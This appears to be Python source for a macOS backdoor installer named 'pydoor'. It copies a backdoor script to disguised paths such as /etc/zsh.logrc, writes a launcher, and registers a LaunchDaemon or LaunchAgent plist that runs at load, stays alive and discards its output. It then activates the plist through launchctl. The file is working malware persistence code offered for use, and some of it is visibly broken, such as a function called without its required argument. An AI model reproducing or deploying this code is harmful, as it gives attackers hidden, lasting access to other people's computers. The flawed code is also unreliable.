#!/usr/local/bin/python3

import sys
import os
import stat

SCRIPT_NAME = "pydoor.py"
PLIST_NAME  = "com.startup.plist"

path_to_python = sys.executable
saved_place = os.getcwd()
backd_content_path = os.path.join(saved_place, SCRIPT_NAME)

def obfuscate_launcher(content):
    return content

def generate_launcher(path, path_to_backd):
    content = "#!/bin/bash\n{} {}".format(path_to_python, path_to_backd)
    content = obfuscate_launcher(content)
    with open(path, 'w') as f:
        f.write(content)

    st = os.stat(path)
    os.chmod(path, st.st_mode | stat.S_IEXEC)


def save_backdoor(path):
    content = open(backd_content_path, 'r').read()
    with open(path, 'w') as f:
        f.write(content)

    return path

# MAC OSX 

def plist_content(backd_path):
    return f"""
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Disabled</key>
    <false/>
    <key>EnvironmentVariables</key>
    <dict>
        <key>PATH</key>
        <string>/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:{path_to_python}:</string> </dict>
    <key>KeepAlive</key>
    <true/>
    <key>Label</key>
    <string>com.pydoor</string>
    <key>ProgramArguments</key>
    <array>
        <string>{path_to_python}</string>
        <string>{backd_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
</dict>
</plist>
"""

def generate_plist(method='daemon'):
    if method == 'daemon':
        path_to_plist = "/Library/LaunchDaemons"
    elif method == 'agent':
        path_to_plist = "/Library/LaunchAgents"

    plist_fn = os.path.join(path_to_plist, PLIST_NAME)
    with open(plist_fn, 'w') as f:
        f.write(plist_content())

    return plist_fn

def activate_plist(path_to_plist):
    os.system("launchctl load -w {}".format(path_to_plist))

def macosx():
    # Check sudo
    if os.getuid() == 0: # SUDO TRUE
        backd_path    = "/etc/zsh.logrc"
        launcher_path = "/etc/csh.logrc"
        plist_method  = 'daemon'
    else:
        homedir       = os.getenv("HOME")
        backd_path    = os.path.join(homedir, ".zsh.logrc")
        launcher_path = os.path.join(homedir, ".csh.logrc")
        plist_method  = 'agent'

    # Save backdoor
    save_backdoor(backd_path)

    # Create launcher script
    generate_launcher(launcher_path, backd_path)

    # Create plist
    plist_path = generate_plist(plist_method)
    activate_plist(plist_path)
